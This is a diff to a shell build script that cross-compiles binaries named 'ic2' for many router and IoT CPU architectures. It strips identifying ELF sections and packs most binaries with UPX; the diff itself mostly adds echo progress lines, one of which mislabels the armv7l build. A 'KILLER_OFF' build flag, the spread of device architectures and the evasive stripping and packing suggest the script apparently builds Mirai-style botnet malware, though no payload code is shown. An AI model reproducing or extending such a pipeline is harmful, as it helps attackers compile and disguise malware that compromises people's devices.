@@ -3,46 +3,84 @@ export PATH=/etc/xcompile/x86_64/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/mip
 
 # build for each arch, note that compilation commands vary from arch to arch
 powerpc-gcc *.c -o ic2.powerpc -DARCH_powerpc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled powerpc"
 mips-gcc *.c -o ic2.mips -DARCH_mips -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled mips"
 mips-gcc *.c -o ic2.mipsrouter -DKILLER_OFF -DARCH_mipsrouter -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled mipsrouter"
 mipsel-gcc *.c -o ic2.mipsel -DARCH_mipsel -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled mipsel"
 x86_64-gcc *.c -o ic2.x86_64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_x86_64 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
+echo "compiled x86_64"
 m68k-gcc *.c -o ic2.m68k -DARCH_m68k -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled m68k"
 sparc-gcc *.c -o ic2.sparc -DARCH_sparc -lpthread -O3 -fomit-frame-pointer -fdata-sections -std=c99 -static-libgcc
+echo "compiled sparc"
 i486-gcc *.c -o ic2.i486 -DARCH_i486 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled i486"
 aarch64-linux-gcc *.c -o ic2.aarch64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_aarch64 -pthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled aarch64"
 armv4l-gcc *.c -o ic2.armv4l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv4l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled armv4l"
 armv5l-gcc *.c -o ic2.armv5l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv5l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled armv5l"
 armv6l-gcc *.c -o ic2.armv6l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv6l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled armv6l"
 armv7l-gcc *.c -o ic2.armv7l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv7l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled armv6l"
 sh4-gcc *.c -o ic2.sh4 -DARCH_sh4 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
+echo "compiled sh4"
 arc-linux-gcc *.c -o ic2.arc -DARCH_arc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
+echo "compiled arc"
 
 # strip bins
+echo "stripping all bins"
 powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.powerpc
+
 mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.mips
+
 mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.mipsel
+
 i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.i486
+
 x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.x86_64
+
 m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.m68k
+
 sparc-strip -S --strip-unneeded ic2.sparc
+
 aarch64-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.aarch64
+
 armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.armv4l
+
 armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.armv5l
+
 armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.armv6l
+
 armv7l-strip -S --strip-unneeded -R .comment -R .note -R .note.gnu.build-id -R .note.gnu.gold-version ic2.armv7l
+
 sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.sh4
+
 arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ic2.arc
 
 #compress
+echo "compressing a few bins with upx"
 upx --lzma ic2.x86_64
+
 upx --lzma ic2.aarch64
+
 upx --lzma ic2.armv4l
+
 upx --lzma ic2.armv5l
+
 upx --lzma ic2.armv6l
+
 upx --lzma ic2.armv7l
+
 upx --lzma ic2.mips
+
 upx --lzma ic2.mipsel
+
 upx --lzma ic2.mipsrouter
 
 #Optional:
